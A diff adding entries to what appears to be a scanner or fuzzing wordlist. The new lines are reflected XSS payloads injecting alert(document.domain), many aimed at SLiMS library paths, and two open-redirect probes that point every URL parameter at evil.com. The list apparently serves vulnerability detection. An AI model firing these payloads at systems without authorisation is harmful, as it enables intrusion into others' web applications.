@@ -930,3 +930,15 @@ request?info=<svg onload=alert(
 /?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
 /zabbix/zabbix.php?action=dashboard.list
 /editor_tools/module?type=files/admin
+/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/
+?protocol=evil.com&domain=evil.com&subdomain=evil.com&host=evil.com&pageurl=evil.com&url=evil.com
+?protocol=/%5cevil.com&domain=/%5cevil.com&subdomain=/%5cevil.com&host=/%5cevil.com&pageurl=/%5cevil.com&url=/%5cevil.com
+/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+/perpustakaan/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+/perpustakaan/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+/e-library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+/perpus/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+/digilib/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+/bulian/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
+/library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php
